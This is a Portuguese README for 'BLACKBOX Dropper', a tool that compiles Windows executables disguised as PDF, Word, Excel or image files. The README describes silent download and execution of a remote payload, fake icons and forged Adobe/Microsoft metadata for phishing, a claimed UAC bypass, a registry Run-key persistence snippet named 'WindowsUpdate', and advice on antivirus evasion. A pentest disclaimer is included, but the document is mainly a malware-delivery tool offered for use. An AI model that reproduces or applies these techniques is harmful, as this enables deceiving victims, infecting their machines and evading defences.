# BLACKBOX Dropper

**Versão:** v1.0  
**Autor:** [Guilherme Alexander](https://github.com/Guilherme-alexander)  
**Baseado em:** Umbrella Dropper por [Alisson Moretto (4w4k3)](https://github.com/4w4k3)  
**Idioma:** Português-BR

---

## Sobre

BLACKBOX Dropper é uma ferramenta de pentest dedicada a criar **droppers** de arquivos. Os arquivos baixados no sistema alvo são executados sem dupla execução do `.exe`, apenas do arquivo embutido (PDF, DOCX, XLSX, JPG/PNG).

Para comprometer o mesmo alvo novamente, é necessário deletar a pasta no sistema alvo:  
`C:\Users\Public\Libraries\Intel`  
Pois o dropper verifica a existência dela para decidir o que fazer.

---

## ⚠️ AVISO LEGAL

```
"EM NENHUMA HIPÓTESE O DETENTOR DOS DIREITOS AUTORAIS OU COLABORADORES
SERÃO RESPONSÁVEIS POR QUAISQUER DANOS DIRETOS, INDIRETOS, INCIDENTAIS,
ESPECIAIS, EXEMPLARES OU CONSEQUENCIAIS (INCLUINDO, MAS NÃO SE LIMITANDO A,
AQUISIÇÃO DE BENS OU SERVIÇOS SUBSTITUTOS; PERDA DE USO, DADOS OU LUCROS;
OU INTERRUPÇÃO DE NEGÓCIOS) SEJA QUAL FOR A CAUSA E SOB QUALQUER TEORIA DE
RESPONSABILIDADE, SEJA EM CONTRATO, RESPONSABILIDADE ESTRITA OU DELITO
(INCLUINDO NEGLIGÊNCIA OU OUTRA FORMA) DECORRENTE DO USO DESTE SOFTWARE,
MESMO QUE CIENTE DA POSSIBILIDADE DE TAIS DANOS."
```

**USE ESTA FERRAMENTA APENAS PARA FINS EDUCACIONAIS OU TRABALHO (PENTEST)!**

---

## Funcionalidades

- ✅ Baixa executável no sistema alvo
- ✅ Execução silenciosa (sem janelas)
- ✅ Baixa e executa o executável apenas uma vez
- ✅ Se o EXE já foi baixado e está rodando, abre apenas o PDF/DOCX/XLSX/JPG/PNG
- ✅ Métodos de phishing incluídos (disfarce com ícones e metadados)
- ✅ Sessões múltiplas desabilitadas (evita execução duplicada)
- ✅ Bypass UAC (sem necessidade de privilégios administrativos)
- ✅ Suporte para Windows e Linux
- ✅ Interface em Português-BR
- ✅ Compilação automática com PyInstaller
- ✅ Metadados falsos (Adobe/Microsoft)

---

## Dependências

### Linux (Ubuntu/Debian/Kali):

O BLACKBOX usa **Python 3** para execução, mas a compilação de executáveis Windows via Wine requer **Python 2.7**:

```bash
# 1. Instalar Python 3 e dependências do sistema
sudo apt update
sudo apt install -y wine wget python3 python3-pip

# 2. Instalar PyInstaller para Python 3 (sistema)
pip3 install pyinstaller

# 3. Baixar e instalar Python 2.7 no Wine
wget https://www.python.org/ftp/python/2.7.18/python-2.7.18.msi
wine msiexec /i python-2.7.18.msi /quiet

# 4. Instalar PyInstaller no Wine (Python 2.7)
wine /root/.wine/drive_c/Python27/python.exe -m pip install pyinstaller

# 5. Verificar instalação
wine /root/.wine/drive_c/Python27/python.exe -c "import PyInstaller; print('OK')"
```

### Windows:

No Windows, apenas Python 3 + PyInstaller são necessários:

```powershell
# Instalar Python 3
# Baixar em: https://www.python.org/downloads/

# Instalar PyInstaller
pip install pyinstaller
```

---

## 📂 Estrutura do Projeto

```
BLACKBOX/
│
├── main.py                 # Script principal (Python 3)
├── README.md               # Este arquivo
│
├── dist/                   # Droppers gerados (saída)
│
├── Icons/                  # Ícones para disfarce
│   ├── pdf.ico
│   ├── word.ico
│   ├── excel.ico
│   ├── img.ico
│   └── flash.ico
│
├── Manifest/
│   └── manifest.manifest   # Manifesto do Windows (nível de privilégio)
│
├── Resource/               # Metadados dos arquivos
│   ├── pdf.template        # Metadados - Adobe PDF
│   ├── word.template       # Metadados - Microsoft Word
│   └── excel.template      # Metadados - Microsoft Excel
│
└── Templates/
    └── U_dRoP.py           # Template do dropper (Python 2/3 compatível)
```

---

## Instalação

### Clonar o repositório:

```bash
git clone https://github.com/Guilherme-alexander/BLACKBOX.git
cd BLACKBOX
```

### Linux:

```bash
# Dar permissão de execução
chmod +x main.py

# Executar como root (necessário para Wine)
sudo python3 main.py
```

### Windows:

```powershell
# Executar diretamente
python main.py
```

---

## Como Usar

### Menu Principal:

Ao executar o BLACKBOX, você verá:

```cmd

    ╔════════════════════════════════════════════════════════════════╗
    ║                      BLACKBOX DROPPER v1.0                     ║
    ╚════════════════════════════════════════════════════════════════╝
    ╔═══════════════════════════════════╗
    ║  📦  PACOTE ENTREGUE COM SUCESSO  ║
    ╚═══════════════════════════════════╝
    ┌────────────────────────────────────┐
    │  ┌──────────────────────────────┐  │
    │  │  📦  👾  📦  📦  👹  📦  🕷   │  │
    │  │  📦  📦  🐞  📦  📦  📦  📦  ███████████████████████████████
    │  │  👾  📦  📦  👹  📦  👾  📦  📦  📦  👹  👾  📦  👾  👾
    │  │  📦  👹  📦  📦  🐞  📦  📦  ███████████████████████████████
    │  │  🕷   📦  📦  👾  🐞  📦  👹  │  │
    │  └──────────────────────────────┘  │
    │  │ DROPPER READY                │  │
    └────────────────────────────────────┘

        [1] Gerar Dropper        por: Guilherme Alexander
        [2] Ajuda                https://github.com/Guilherme-alexander
        [0] Sair

Selecione uma opção do menu:

 BLACKBOX >>
```

### Submenu de Geração (após escolher opção 1):

```
[1] PDF DROPPER    - PDF + Executável
[2] WORD DROPPER   - DOCX + Executável
[3] EXCEL DROPPER  - XLSX + Executável
[4] IMAGE DROPPER  - JPG/PNG + Executável
[0] Voltar
```

### Exemplo de Uso Completo:

```bash
# 1. Inicie o BLACKBOX
sudo python3 main.py

# 2. No menu principal, digite 1
BLACKBOX >> 1

# 3. No submenu, escolha o tipo (ex: 1 para PDF)
BLACKBOX >> 1

# 4. Insira as URLs solicitadas
📥 URL do EXE para baixar: http://192.168.1.100/payload.exe
📄 URL do arquivo para embutir: http://192.168.1.100/documento.pdf

# 5. Aguarde a compilação (pode levar alguns segundos)
[*] Construindo dropper...

# 6. Arquivo gerado com sucesso!
✅ Dropper salvo em: dist/Blackbox_Pdf_.pdf.exe
```

---

## Como Funciona o Dropper

### 1. Geração do Dropper

O processo de geração segue estas etapas:

1. **Leitura do Template**: O arquivo `Templates/U_dRoP.py` é lido
2. **Injeção de URLs**: As URLs fornecidas são inseridas no código
3. **Geração do D.py**: Um arquivo temporário é criado com o payload completo
4. **Compilação**: O PyInstaller compila `D.py` para um executável Windows (`.exe`)
5. **Personalização**: Ícones e metadados são aplicados para disfarce
6. **Limpeza**: Arquivos temporários são removidos
7. **Entrega**: O dropper final fica em `dist/`

### 2. Execução no Sistema Alvo

Quando a vítima executa o dropper (que parece ser um PDF/DOCX/etc):

1. **Criação de Diretório**: Cria `C:\Users\Public\Libraries\Intel\`
2. **Download do Documento**: Baixa o PDF/DOCX/XLSX/JPG da URL fornecida
3. **Abertura do Documento**: Abre o documento para disfarçar a atividade
4. **Download do Payload**: Baixa o executável malicioso da URL fornecida
5. **Execução do Payload**: Executa o payload silenciosamente em background
6. **Persistência**: Se executado novamente, apenas abre o documento (evita duplicação)

### 3. Técnicas de Evasão

- **Disfarce Visual**: O ícone do arquivo é igual ao de um documento legítimo
- **Metadados Falsos**: As propriedades do arquivo mostram Adobe/Microsoft
- **Execução Silenciosa**: O payload roda sem janelas visíveis
- **Localização Oculta**: Os arquivos são salvos em uma pasta pouco monitorada
- **Verificação de Existência**: Evita múltiplas execuções do mesmo payload

---

## Personalização

### Alterar o Comportamento do Dropper

Edite `Templates/U_dRoP.py` para modificar:

```python
# Mudar diretório de instalação
dir = "C:\\Users\\Public\\Libraries\\Intel\\" + nameem

# Mudar nome do executável
nameem = 'adobeflashplayer' + '.exe'

# Adicionar persistência no registro
# Adicionar comandos adicionais
```

### Adicionar Novos Ícones

1. Coloque arquivos `.ico` em `Icons/`
2. Atualize o `main.py` adicionando novas configurações

### Modificar Metadados

Edite os arquivos em `Resource/` para alterar:

- `pdf.template` - Metadados do Adobe PDF
- `word.template` - Metadados do Microsoft Word
- `excel.template` - Metadados do Microsoft Excel

---

## Testado em

### Sistemas de Desenvolvimento (Linux):
- ✅ Kali Linux (ROLLING)
- ✅ Ubuntu 20.04 LTS / 22.04 LTS
- ✅ Debian 10/11
- ✅ Linux Mint 20/21

### Sistemas Alvo (Windows):
- ✅ Windows 7 (x86/x64)
- ✅ Windows 8.1 (x86/x64)
- ✅ Windows 10 (x86/x64)
- ✅ Windows 11 (x64)

---

## ❓ Perguntas Frequentes

### Por que Python 2.7 no Wine se o projeto é Python 3?

O **BLACKBOX Dropper** usa Python 3 para rodar (`main.py`), mas a compilação de executáveis Windows via Wine no Linux requer Python 2.7 porque:

- O PyInstaller no Wine foi originalmente configurado com Python 2.7
- A versão do PyInstaller que funciona via Wine tem melhor compatibilidade com Python 2.7
- O template `U_dRoP.py` é compatível com **Python 2 e 3** (graças ao `try/except` no código)

**Resumo:** 
- 🐍 **Sistema host**: Python 3 (para rodar o BLACKBOX)
- 🍷 **Wine**: Python 2.7 (para compilar os droppers .exe)
- 📦 **Template**: Compatível com ambas as versões

### Por que o dropper só funciona uma vez no alvo?

O dropper verifica se a pasta `C:\Users\Public\Libraries\Intel\` existe. Se já existir, ele apenas abre o documento e não baixa/executa o payload novamente. Para recomprometer o alvo, delete esta pasta manualmente.

### Como fazer o dropper persistir no sistema?

Edite o template `Templates/U_dRoP.py` e adicione:

```python
# Exemplo de persistência no registro
import winreg
key = winreg.HKEY_CURRENT_USER
subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(handle, "WindowsUpdate", 0, winreg.REG_SZ, dir)
winreg.CloseKey(handle)
```

### O dropper funciona em sistemas com antivírus?

O BLACKBOX usa técnicas básicas de evasão, mas antivírus modernos podem detectar. Para testes mais avançados, considere:

- Ofuscação de código
- Empacotamento (packing)
- Assinatura digital
- Técnicas de evasão de sandbox

---

## Segurança e Ética

- ✅ **Use apenas em ambientes autorizados**
- ✅ **Mantenha em VMs isoladas**
- ✅ **Nunca compartilhe os droppers gerados publicamente**
- ✅ **Documente todos os testes realizados**
- ✅ **Obtenha autorização por escrito antes de qualquer teste**

---

## 📄 Licença

Este projeto é licenciado sob a licença **BSD-3-Clause** - veja o arquivo [LICENSE](LICENSE) para detalhes.

---

## Agradecimentos

- [Alisson Moretto (4w4k3)](https://github.com/4w4k3) - Criador do Umbrella Dropper
- Comunidade de Pentest e Segurança da Informação
- Contribuidores e testadores

---

## 📧 Contato

- **GitHub:** [https://github.com/Guilherme-alexander](https://github.com/Guilherme-alexander)
- **Projeto Original:** [Umbrella Dropper](https://github.com/4w4k3/Umbrella)

---

## ⭐ Considerações Finais

**BLACKBOX Dropper** é uma ferramenta poderosa para testes de penetração, mas com grande poder vem grande responsabilidade.

> *"Um espírito nobre engrandece o menor dos homens"*
